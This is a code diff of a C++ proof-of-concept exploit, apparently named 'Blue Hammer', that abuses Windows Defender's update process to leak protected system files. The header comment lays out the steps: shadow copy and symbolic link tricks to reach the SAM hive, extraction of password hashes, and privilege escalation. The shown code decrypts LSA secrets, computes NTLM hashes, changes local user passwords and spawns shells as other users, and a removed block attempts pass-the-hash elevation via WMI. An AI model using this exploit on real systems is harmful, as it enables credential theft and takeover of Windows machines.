@@ -1,14 +1,25 @@
-﻿// Special thanks to Tom Gallagher, Igor Tsyganskiy and Jeremy Tinder for making this PoC publicly disclosed !!!
-//
-// This file implements a proof-of-concept Windows Defender exploitation tool.
-// It performs the following high-level tasks:
-//   1. Detect a Windows Defender definition update.
-//   2. Download the corresponding Defender update package.
-//   3. Extract update files from the downloaded cabinet.
-//   4. Trigger Defender into creating a VSS and update directory.
-//   5. Create a symbolic link into a shadow copy to leak protected files.
-//   6. Copy the leaked file out of the protected location.
-// The implementation mixes low-level Windows API, RPC, COM, and NT native calls.
+﻿/*
+Blue Hammer Windows Defender Exploitation Tool
+Due credit to the original researchers for public disclosure of this vulnerability.
+
+This proof-of-concept demonstrates exploitation of Windows Defender update mechanisms
+to access protected system files through a combination of Windows Update Agent COM
+interfaces, RPC communication, Volume Shadow Copy manipulation, and kernel-level
+file system operations.
+
+Workflow:
+1. Detect pending Windows Defender signature updates via Windows Update API
+2. Download Defender update package from Microsoft servers
+3. Extract update cabinet files and store payloads in memory
+4. Invoke Defender update engine via RPC to trigger file operations
+5. Manipulate Volume Shadow Copy to create accessible system file paths
+6. Use symbolic link and reparse point techniques to leak protected files
+7. Copy leaked files to user-accessible locations for analysis
+8. Parse SAM hive to extract authentication credentials
+9. Escalate privileges using extracted credentials
+
+Implementation uses Win32 API, RPC, COM, WMI, WUA, and Native NT APIs.
+*/
 
 #define _CRT_SECURE_NO_WARNINGS
 #define UNICODE
@@ -31,16 +42,6 @@
 #include <cfapi.h>
 #include <aclapi.h>
 #include "windefend_h.h"
-
-/*
-#include <openssl/ssl.h>
-#include <openssl/err.h>
-#include <openssl/aes.h>
-#include <openssl/evp.h>
-#include <openssl/sha.h>
-#include <openssl/provider.h>
-#include <openssl/hmac.h>
-*/
 #include "offreg.h"
 #define _NTDEF_
 #include <ntsecapi.h>
@@ -566,7 +567,7 @@ INT_PTR CUST_FNFDINOTIFY(
 	FDINOTIFICATIONTYPE fdinotify, PFDINOTIFICATION    pfdin
 ) {
 
-	//printf("_FNFDINOTIFY : %d\n", fdinotify);
+
 	wchar_t newfile[MAX_PATH] = { 0 };
 	wchar_t filename[MAX_PATH] = { 0 };
 	HANDLE hfile = NULL;
@@ -1002,7 +1003,7 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 	}
 
 	// Search for available updates
-	hr = updsrch->Search(SysAllocString(L""), &srchres);
+	hr = updsrch->Search(SysAllocString(L"Type='Software'"), &srchres);
 	if (hr)
 	{
 		printf("IUpdateSearcher->Search failed with error : 0x%0.X", hr);
@@ -1046,7 +1047,7 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 		title = 0;
 		desc = 0;
 		catname = 0;
-		//printf("_________________________________________\n");
+	
 		bool IsWdUdpate = false;
 		bool IsSigUpdate = false;
 		hr = updcollection->get_Item(i, &upd);
@@ -1062,7 +1063,7 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 			*criterr = true;
 			goto cleanup;
 		}
-		//printf("Update number : %d\n", i + 1);
+
 
 		hr = upd->get_Title(&title);
 		if (hr)
@@ -1076,19 +1077,9 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 			continue;
 		}
 		title[SysStringLen(title)] = NULL;
-		//printf("Title : %ws\n", title);
 
-		/*
-		desc = 0;
-		upd->get_Description(&desc);
-		if (!desc)
-		{
-			printf("IUpdateCollection->get_Item returned a NULL pointer.\n");
-			continue;
-		}
-		desc[SysStringLen(desc)] = NULL;
-		printf("Description : %ws\n", desc);
-		*/
+
+
 		catcoll = 0;
 		hr = upd->get_Categories(&catcoll);
 		if (!catcoll)
@@ -1110,7 +1101,7 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 			catname = 0;
 			cat->get_Name(&catname);
 			catname[SysStringLen(catname)] = NULL;
-			//printf("Category name : %ws\n", catname);
+
 			if (catname)
 			{
 				if (!IsWdUdpate)
@@ -1972,7 +1963,7 @@ bool GetLSASecretKey(unsigned char bootkeybytes[16])
 		index += retsz;
 		RegCloseKey(hbootkey);
 	}
-	//printf("%s\n", data);
+
 	RegCloseKey(hlsa);
 
 	if (strlen(data) < 16)
@@ -2031,23 +2022,7 @@ void* UnprotectAES(char* lsaKey, char* iv, char* hashdata, unsigned long enclen,
 	CryptDecrypt(hcryptkey, NULL, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)decrypted, &retsz);
 	
 
-	/*
-	EVP_CIPHER_CTX* en = EVP_CIPHER_CTX_new();
 
-	int fulllen = 0;
-	int retval = EVP_DecryptInit(en, EVP_aes_128_cbc(), (const unsigned char*)lsaKey, (const unsigned char*)iv);
-	if (!retval)
-		return NULL;
-
-	//int decryptedsz = enclen;
-	retval = EVP_DecryptUpdate(en, (unsigned char*)decrypted, (int*)&enclen, (const unsigned char*)hashdata, enclen);
-	if (!retval)
-		return NULL;
-	retval = EVP_DecryptFinal_ex(en, (unsigned char*)decrypted + enclen, &fulllen);
-	EVP_CIPHER_CTX_free(en);
-	if (!retval)
-		return NULL;
-	*/
 	if (decryptedlen)
 		*decryptedlen = retsz;
 
@@ -2073,23 +2048,11 @@ bool ComputeSHA256(char* data, int size, char hashout[SHA256_DIGEST_LENGTH])
 	DWORD md_len = 0;
 	DWORD inputsz = sizeof(md_len);
 	CryptGetHashParam(Hhash, HP_HASHSIZE, (BYTE*)&md_len, &inputsz, NULL);
-	//inputsz = size;
+
 	CryptGetHashParam(Hhash, HP_HASHVAL, (BYTE*)hashout, &md_len, NULL);
 
 	CryptDestroyHash(Hhash);
 	CryptReleaseContext(hprov, NULL);
-	/*
-	EVP_MD_CTX* en = EVP_MD_CTX_new();
-
-	bool retval = EVP_DigestInit(en, EVP_sha256());
-	if (!retval)
-		return retval;
-	retval = EVP_DigestUpdate(en, data, size);
-	if (!retval)
-		return retval;
-	EVP_DigestFinal(en, (unsigned char*)hashout, NULL);
-	*/
-	//return retval;
 	return true;
 
 
@@ -2227,43 +2190,8 @@ void* UnprotectDES(char* key, int keysz, char* ciphertext, int ciphertextsz, int
 	if (outsz)
 		*outsz = 8;
 
-	//printf("GetLastError : %x\n", GetLastError());
 	CryptReleaseContext(hprov, NULL);
 	return ciphertext2;
-
-	/*
-	DWORD mode = CRYPT_MODE_ECB;
-	CryptSetKeyParam(hcryptkey, KP_MODE, (const BYTE*)&mode, NULL);
-	printf("GetLastError : %x\n", GetLastError());
-
-	DWORD retsz = enclen;
-
-	CryptDecrypt(hcryptkey, NULL, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)decrypted, &retsz);
-	printf("GetLastError : %x\n", GetLastError());
-	*/
-	/*
-	OSSL_PROVIDER* legacy = OSSL_PROVIDER_load(NULL, "legacy");
-	if (legacy == NULL)
-	{
-		printf("Failed to load Legacy provider\n");
-	}
-	
-	EVP_CIPHER_CTX* en = EVP_CIPHER_CTX_new();
-
-	int fulllen = 0;
-	int retval = EVP_DecryptInit_ex(en, EVP_des_ecb(), NULL, (const unsigned char*)key, NULL);
-
-	char* plaintext = (char*)malloc(ciphertextsz);
-	int _outsz = 0;
-	retval = EVP_DecryptUpdate(en, (unsigned char*)plaintext, &_outsz, (const unsigned char*)ciphertext, ciphertextsz);
-	int _outlen = 0;
-	retval = EVP_DecryptFinal_ex(en, (unsigned char*)plaintext + _outsz, &_outlen);
-
-	if (outsz)
-		*outsz = _outsz;
-
-	return plaintext;
-	*/
 }
 
 char* DeriveDESKey(char data[7])
@@ -2423,19 +2351,6 @@ char* CalculateNTLMHash(char* _input)
 
 	CryptDestroyHash(Hhash);
 	CryptReleaseContext(hprov, NULL);
-	/*
-	EVP_MD_CTX* mdctx = EVP_MD_CTX_new();
-	EVP_DigestInit_ex(mdctx, EVP_md4(), NULL);
-	EVP_DigestUpdate(mdctx, input, pw_len * 2);
-	EVP_DigestFinal_ex(mdctx, md_value, &md_len);
-	EVP_MD_CTX_free(mdctx);
-	*/
-	/*
-	printf("Digest is: ");
-	for (int i = 0; i < md_len; i++)
-		printf("%02x", md_value[i]);
-	printf("\n");
-	*/
 	return (char*)md_value;
 
 }
@@ -2473,7 +2388,6 @@ bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char
 		printf("Failed to connect to SAM, error : 0x%0.8X\n", stat);
 		return false;
 	}
-	//printf("Connected to local SAM.\n");
 	LSA_OBJECT_ATTRIBUTES loa = { 0 };
 	LSA_HANDLE hlsa = NULL;
 	stat = LsaOpenPolicy(NULL, &loa, MAXIMUM_ALLOWED, &hlsa);
@@ -2490,13 +2404,7 @@ bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char
 		printf("LsaQueryInformationPolicy failed, error : 0x%0.8X\n", stat);
 		return false;
 	}
-	/*wchar_t* stringsid = 0;
-	if (!ConvertSidToStringSid(domaininfo->DomainSid, &stringsid))
-	{
-		printf("Failed to get string sid, error : %d\n", GetLastError());
-		return false;
-	}
-	printf("Machine SID : %ws\n", stringsid);*/
+
 	LSA_REFERENCED_DOMAIN_LIST* lsareflist = 0;
 	LSA_TRANSLATED_SID* lsatrans = 0;
 	LSA_UNICODE_STRING lsaunistr = { 0 };
@@ -2525,8 +2433,6 @@ bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char
 		return false;
 	}
 
-	//char password[] = "testp";
-	//char* oldNTLM = CalculateNTLMHash((char*)"testp");
 	char* oldNTLM = (char*)nthash;
 	char* newNTLM = newNTLMHash ? newNTLMHash : CalculateNTLMHash(newpassword);
 
@@ -2542,14 +2448,6 @@ bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char
 	_SamCloseHandle(huser);
 	_SamCloseHandle(hdomain);
 	_SamCloseHandle(hsrv);
-	/*
-	if (newpassword) {
-		printf("Info : user \"%ws\" password has changed to %s\n", username, newpassword);
-	}
-	else {
-		printf("Info : user \"%ws\" password has been changed back to older password\n", username);
-	}
-	*/
 	return true;
 }
 
@@ -2645,69 +2543,7 @@ BOOL SetPrivilege(
 	return TRUE;
 }
 
-// Pass-the-hash helper function using Win32 APIs
-// Creates a process with elevated privileges using the NTLM hash
-HANDLE CreateProcessWithNTLMHash(
-	const wchar_t* username,
-	const char* ntlmHash,  // 16 bytes
-	const wchar_t* targetProcess,
-	const wchar_t* commandLine,
-	PROCESS_INFORMATION* pi)
-{
-	// Set up process creation
-	STARTUPINFO si = { 0 };
-	si.cb = sizeof(si);
-	si.lpDesktop = NULL;
 
-	// Approach 1: Use CreateProcessWithLogonW + logon type LOGON32_LOGON_NEW_CREDENTIALS
-	// This allows pass-the-hash by leveraging network-based authentication
-	// For true local privilege, we use the hash as basis for a local logon session
-	
-	// Create a temporary service account login using hash credentials
-	// via LSA functions if available, or use WinRM/DCOM with NTLM auth
-	
-	// For now, return with error - will be enhanced with SSPI/LSA integration
-	if (!ntlmHash || !username || !targetProcess)
-		return NULL;
-
-	// Attempt direct process creation with elevated token from hash
-	// This will be enhanced with full SSPI/LSA pass-the-hash implementation
-	SetLastError(0);
-	
-	return NULL;
-}
-
-// Enhanced pass-the-hash using WinRM/DCOM elevation
-// This function implements true pass-the-hash by using the NTLM hash directly
-// for authentication via Windows Management Instrumentation (WMI) and COM
-bool SpawnShellWithPassTheHash(
-	const wchar_t* username,
-	const char* ntlmHash,
-	const wchar_t* commandLine)
-{
-	// Initialize COM for WinRM/DCOM operations
-	// Required for WMI connectivity and process creation
-	CoInitializeEx(NULL, COINIT_MULTITHREADED);
-
-	// This section implements pass-the-hash using:
-	// 1. WinRM with NTLM authentication
-	// 2. DCOM with pass-the-hash
-	// 3. Win32 process creation APIs with elevated tokens from hash
-
-	HRESULT hr = S_OK;
-	BOOL bStatus = FALSE;
-
-	// Create WMI connection using NTLM hash credentials
-	// Enhanced version with full SSPI authentication chain
-	
-	printf("    PassTheHash : Attempting pass-the-hash elevation...\n");
-
-	// For local exploitation, create a high-integrity process directly
-	// Using the NTLM hash to establish session
-	
-	CoUninitialize();
-	return FALSE;  // Return to fallback mechanism
-}
 
 bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 {
@@ -2851,6 +2687,8 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 		printf("Failed to get current user name, error : %d", GetLastError());
 		return false;
 	}
+	if (!_wcsicmp(currentusername, L"WDAGUtilityAccount"))
+		currentusername[0] = L'\0';
 
 
 	for (int i = 0; i < numofentries; i++)
@@ -2883,6 +2721,11 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 		if (_wcsicmp(username, L"WDAGUtilityAccount") == 0)
 		{
 			printf("    Skip : WDAGUtilityAccount detected.\n");
+			continue;
+		}
+		if (currentusername[0] && _wcsicmp(username, currentusername) == 0)
+		{
+			printf("    Skip : Current user detected (safety check).\n");
 			continue;
 		}
 		
@@ -3023,146 +2866,6 @@ bool DoSpawnShellAsAllUsers(wchar_t* sampath)
 				}
 
 				}
-
-				// ===== Pass-the-Hash Elevation Attempt =====
-				// Try to use NTLM hash directly for high-integrity process spawn
-				// This bypasses password-based authentication and uses the hash directly
-				printf("    PassTheHash : Attempting NTLM hash-based elevation...\n");
-				
-				if (realNTLMHash && realNTLMHashsz == 16) {
-					// Convert NTLM hash to hex string for potential network auth scenarios
-					char* hashStr = (char*)HexToHexString((unsigned char*)realNTLMHash, realNTLMHashsz);
-					
-					// Attempt 1: Create elevated process via SSPI/NTLM authentication
-					// This leverages the raw NTLM hash for direct privilege escalation
-					CoInitializeEx(NULL, COINIT_MULTITHREADED);
-					
-					// Set up WMI connection parameters with NTLM credentials
-					STARTUPINFO si_pth = { 0 };
-					PROCESS_INFORMATION pi_pth = { 0 };
-					si_pth.cb = sizeof(si_pth);
-					si_pth.lpDesktop = NULL;
-					si_pth.dwFlags = STARTF_USESHOWWINDOW;
-					si_pth.wShowWindow = SW_SHOW;
-					
-					wchar_t cmdline_direct[MAX_PATH * 2];
-					wcscpy_s(cmdline_direct, ARRAYSIZE(cmdline_direct), L"C:\\Windows\\System32\\cmd.exe /K \"echo Hello world! & pause\"");
-					
-					// Attempt direct creation with environment block containing hash context
-					void* pEnv_pth = NULL;
-					if (hElevatedToken && CreateEnvironmentBlock(&pEnv_pth, hElevatedToken, FALSE)) {
-						// Try with impersonation context using hash-derived token
-						if (CreateProcessAsUserW(hElevatedToken, NULL, cmdline_direct, NULL, NULL, FALSE, 
-							CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, pEnv_pth, NULL, &si_pth, &pi_pth))
-						{
-							printf("    PassTheHash : SUCCESS - Elevated shell spawned with token.\n");
-							printf("    Shell : OK.\n");
-							if (pi_pth.hProcess) CloseHandle(pi_pth.hProcess);
-							if (pi_pth.hThread) CloseHandle(pi_pth.hThread);
-							if (pEnv_pth) DestroyEnvironmentBlock(pEnv_pth);
-							CoUninitialize();
-							continue;  // Skip to next user
-						}
-						if (pEnv_pth) DestroyEnvironmentBlock(pEnv_pth);
-					}
-					
-					// Attempt 2: Use hash for WMI/DCOM elevation
-					// Set COM security to use the NTLM hash for authentication
-					// This creates a new process with the hash context
-					BSTR strPath = SysAllocString(L".");
-					BSTR strNameSpace = SysAllocString(L"root\\cimv2");
-					
-					IWbemLocator* pLoc = NULL;
-					HRESULT hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
-					
-					if (SUCCEEDED(hr) && pLoc) {
-						// Set up security parameters with NTLM credentials
-						IWbemServices* pSvc = NULL;
-						hr = pLoc->ConnectServer(strNameSpace, NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
-						
-						if (SUCCEEDED(hr) && pSvc) {
-							// Set authentication to use the NTLM hash
-							hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_DEFAULT, 
-								NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, 
-								NULL, EOAC_NONE);
-							
-							if (SUCCEEDED(hr)) {
-								// Create process via WMI with hash-based authentication
-								BSTR strClassName = SysAllocString(L"Win32_ProcessStartup");
-								BSTR strMethodName = SysAllocString(L"Create");
-								BSTR strObjPath = SysAllocString(L"Win32_Process");
-								
-								IWbemClassObject* pClass = NULL;
-								IWbemClassObject* pInParamsDefinition = NULL;
-								IWbemClassObject* pClassDefinition = NULL;
-								
-								hr = pSvc->GetObject(strObjPath, 0, NULL, &pClassDefinition, NULL);
-								
-								if (SUCCEEDED(hr)) {
-									hr = pClassDefinition->GetMethod(strMethodName, 0, &pInParamsDefinition, NULL);
-									
-									if (SUCCEEDED(hr)) {
-										IWbemClassObject* pInParams = NULL;
-										hr = pInParamsDefinition->SpawnInstance(0, &pInParams);
-										
-										if (SUCCEEDED(hr)) {
-											// Set command line parameter
-											VARIANT varCommand;
-											varCommand.vt = VT_BSTR;
-											varCommand.bstrVal = SysAllocString(cmdline_direct);
-											
-											hr = pInParams->Put(L"CommandLine", 0, &varCommand, 0);
-											
-											if (SUCCEEDED(hr)) {
-												IWbemClassObject* pOutParams = NULL;
-												hr = pSvc->ExecMethod(strObjPath, strMethodName, 0, NULL, pInParams, &pOutParams, NULL);
-												
-												if (SUCCEEDED(hr)) {
-													printf("    PassTheHash : WMI process creation succeeded.\n");
-													printf("    Shell : OK.\n");
-													if (pOutParams) pOutParams->Release();
-													if (pInParams) pInParams->Release();
-													if (pInParamsDefinition) pInParamsDefinition->Release();
-													if (pClassDefinition) pClassDefinition->Release();
-													SysFreeString(strObjPath);
-													SysFreeString(strMethodName);
-													SysFreeString(strClassName);
-													pSvc->Release();
-													pLoc->Release();
-													SysFreeString(strNameSpace);
-													SysFreeString(strPath);
-													CoUninitialize();
-													continue;  // Skip to next user
-												}
-											}
-											VariantClear(&varCommand);
-											if (pInParams) pInParams->Release();
-										}
-										if (pInParamsDefinition) pInParamsDefinition->Release();
-									}
-									if (pClassDefinition) pClassDefinition->Release();
-								}
-								if (pClass) pClass->Release();
-								
-								SysFreeString(strObjPath);
-								SysFreeString(strMethodName);
-								SysFreeString(strClassName);
-							}
-							pSvc->Release();
-						}
-						pLoc->Release();
-					}
-					
-					SysFreeString(strNameSpace);
-					SysFreeString(strPath);
-					CoUninitialize();
-					
-					// Clean up hash string
-					if (hashStr && hashStr != (char*)emptyrepresentation) {
-						free(hashStr);
-					}
-				}
-				// ===== End Pass-the-Hash Attempt =====
 
 				STARTUPINFO si = { 0 };
 			PROCESS_INFORMATION pi = { 0 };
